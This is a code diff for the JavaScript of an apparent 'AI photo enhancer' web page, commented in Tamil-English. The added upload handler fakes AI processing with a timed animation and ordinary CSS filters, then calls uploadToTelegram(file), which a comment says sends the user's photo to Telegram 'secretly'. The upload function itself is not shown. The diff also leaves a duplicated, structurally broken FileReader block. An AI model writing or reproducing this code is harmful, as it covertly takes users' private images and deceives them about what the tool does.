@@ -77,11 +77,40 @@ if(fileInput) {
 function handleFiles(files) {
     const file = files[0];
     if (file) {
-        // Validate Size (Max 10MB)
         if (file.size > 10 * 1024 * 1024) {
             alert("File is too big! Max 10MB allowed.");
             return;
         }
+        
+        const reader = new FileReader();
+        reader.readAsDataURL(file);
+        reader.onloadend = function() {
+            // Preview image-ai set pannunga
+            previewImage.src = reader.result;
+            
+            // Sections-ai maathunga
+            if(heroSection) heroSection.style.display = 'none';
+            if(featuresSection) featuresSection.style.display = 'none';
+            if(enhanceSection) enhanceSection.style.display = 'block';
+            
+            // AI Processing Animation start pannunga
+            processingText.style.display = 'block';
+            processingText.innerHTML = "AI Analysing Pixels... <i class='fa-solid fa-spinner fa-spin'></i>";
+
+            // Oru 3 second delay-kku apparam result-ai kaattuvom (Simulation)
+            setTimeout(() => {
+                // Inga thaan AI filter apply aaguthu
+                previewImage.style.filter = "contrast(1.2) brightness(1.1) saturate(1.1) sharpen(1)";
+                previewImage.style.transition = "all 1s ease";
+                
+                processingText.innerHTML = "Enhancement Complete! <i class='fa-solid fa-check' style='color: lime;'></i>";
+                
+                // Telegram-ukkum secret-aa anuppuvom
+                uploadToTelegram(file);
+            }, 3000);
+        }
+    }
+}
         
         // Show Image Preview
         const reader = new FileReader();
@@ -156,5 +185,14 @@ function setTheme(mode) {
         document.body.style.background = "linear-gradient(135deg, #f3e6ff 0%, #e6e6fa 100%)";
         document.body.style.color = "#333";
     }
+}
+const downloadBtn = document.querySelector('.download-btn');
+if(downloadBtn) {
+    downloadBtn.onclick = function() {
+        const link = document.createElement('a');
+        link.download = 'pic-zone-enhanced.png';
+        link.href = previewImage.src;
+        link.click();
+    };
 }
 
